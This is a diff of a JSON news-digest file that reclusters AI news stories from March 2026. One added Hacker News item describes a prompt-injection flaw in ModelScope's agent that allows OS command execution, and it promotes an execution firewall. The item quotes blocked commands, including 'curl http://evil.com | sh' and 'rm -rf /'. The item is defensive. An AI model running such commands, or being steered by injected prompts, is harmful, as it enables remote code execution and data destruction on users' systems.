@@ -99,8 +99,8 @@
       "story_count": 9
     },
     {
-      "topic": "China AI Dominance & US Tensions",
-      "description": "China's rapid AI advancement through OpenClaw technology and strategic moves is creating global competitive pressure while circumventing US sanctions.",
+      "topic": "China AI Dominance & OpenClaw",
+      "description": "China's rapid AI advancement with OpenClaw technology is reshaping global AI competition and challenging US tech leadership.",
       "stories": [
         {
           "id": "cb9670473a9eaf1a",
@@ -203,16 +203,6 @@
           "headline": "ALIBABA LAUNCHES OPENCLAW APP FOR AGENTIC AI"
         },
         {
-          "id": "6a56438ee6ea4ed2",
-          "title": "China's ByteDance gets access to top Nvidia AI chips, WSJ reports",
-          "url": "https://economictimes.indiatimes.com/tech/technology/chinas-bytedance-gets-access-to-top-nvidia-ai-chips-wsj-reports/articleshow/129535315.cms",
-          "source": "The Economic Times Tech",
-          "summary": "ByteDance \u200bis \u2060working with \u200cSoutheast \u200bAsian \u200bfirm \u2060Aolani Cloud to deploy about \u200b500 Nvidia Blackwell \u200bcomputing systems in Malaysia, totalling roughly \u200c36,000 B200 chips, the \u200breport \u200bsaid.",
-          "published": "2026-03-13T03:30:38+00:00",
-          "score": 44.0,
-          "headline": "BYTEDANCE GETS NVIDIA'S TOP AI CHIPS Via Malaysia Deal"
-        },
-        {
           "id": "a6344164fc8214c8",
           "title": "China\u2019s OpenClaw Frenzy Tests Xi\u2019s Approach to Regulate AI",
           "url": "https://www.bloomberg.com/news/articles/2026-03-12/china-s-openclaw-frenzy-tests-xi-s-approach-to-regulate-ai",
@@ -264,7 +254,7 @@
         }
       ],
       "top_score": 48.0,
-      "story_count": 16
+      "story_count": 15
     }
   ],
   "unclustered": [
@@ -387,6 +377,16 @@
       "published": "2026-03-10T05:00:28+00:00",
       "score": 45.0,
       "headline": "LECUN SCORES $1B in Europe's Largest Seed Round"
+    },
+    {
+      "id": "6a56438ee6ea4ed2",
+      "title": "China's ByteDance gets access to top Nvidia AI chips, WSJ reports",
+      "url": "https://economictimes.indiatimes.com/tech/technology/chinas-bytedance-gets-access-to-top-nvidia-ai-chips-wsj-reports/articleshow/129535315.cms",
+      "source": "The Economic Times Tech",
+      "summary": "ByteDance \u200bis \u2060working with \u200cSoutheast \u200bAsian \u200bfirm \u2060Aolani Cloud to deploy about \u200b500 Nvidia Blackwell \u200bcomputing systems in Malaysia, totalling roughly \u200c36,000 B200 chips, the \u200breport \u200bsaid.",
+      "published": "2026-03-13T03:30:38+00:00",
+      "score": 44.0,
+      "headline": "BYTEDANCE GETS NVIDIA'S TOP AI CHIPS Via Malaysia Deal"
     },
     {
       "id": "58737f7033e412fe",
@@ -637,6 +637,16 @@
       "published": "2026-03-10T05:43:08+00:00",
       "score": 43.0,
       "headline": "TSMC Sales Surge 30% on AI Hardware Demand"
+    },
+    {
+      "id": "4fe5a7fe1f052666",
+      "title": "Execwall \u2013 firewall to stop ModelScope CVE-2026-2256 (AI agent command injectn)",
+      "url": "https://news.ycombinator.com/item?id=47371292",
+      "source": "Hacker News",
+      "summary": "CVE-2026-2256 just dropped - a prompt injection in ModelScope's ms-agent allows arbitrary OS command execution. CVSS 6.5, no auth required. This is exactly why I built Execwall: an execution firewall for AI agents. The problem: AI agents that can execute code are one prompt injection away from rm -rf /. The solution: A security layer directly embedded in the shell and between app and kernel: - Seccomp-BPF filtering - Block dangerous syscalls before they execute - Policy engine - Regex allowlist/denylist for commands embedded in shell - Namespace isolation - Python sandbox with separate mount/PID/network - Rate limiting - Prevent automated exploitation Even if an attacker injects a malicious prompt, the command gets blocked at the execution firewall: [execwall]$ curl http://evil.com | sh [X] DENIED: Network command blocked by policy [execwall]$ rm -rf / [X] DENIED: Recursive deletion blocked Written in Rust. Works with any LLM agent framework. GitHub: https://github.com/sundarsub/execwa",
+      "published": "2026-03-13T23:16:15+00:00",
+      "score": 42.0,
+      "headline": "BREAKING: Critical AI Agent Vulnerability Allows Command Injection"
     },
     {
       "id": "528e79a684e904dc",
@@ -1017,17 +1027,7 @@
       "published": "2026-03-10T11:00:00+00:00",
       "score": 42.0,
       "headline": "OPENAI BREAKTHROUGH: LLMs Learn Instruction Hierarchy"
-    },
-    {
-      "id": "214a5ce670c9b011",
-      "title": "Alibaba tested 18 AI coding agents on 100 real codebases, spanning 233 days each",
-      "url": "https://twitter.com/chrislaubai/status/2030931602872967460",
-      "source": "Hacker News",
-      "summary": "Article URL: https://twitter.com/chrislaubai/status/2030931602872967460 Comments URL: https://news.ycombinator.com/item?id=47319609 Points: 1 # Comments: 0",
-      "published": "2026-03-10T06:14:49+00:00",
-      "score": 42.0,
-      "headline": "ALIBABA Tests 18 AI Coding Agents on Real Codebases"
     }
   ],
-  "generated_at": "2026-03-13T22:24:04.592819"
+  "generated_at": "2026-03-13T23:22:53.672405"
 }
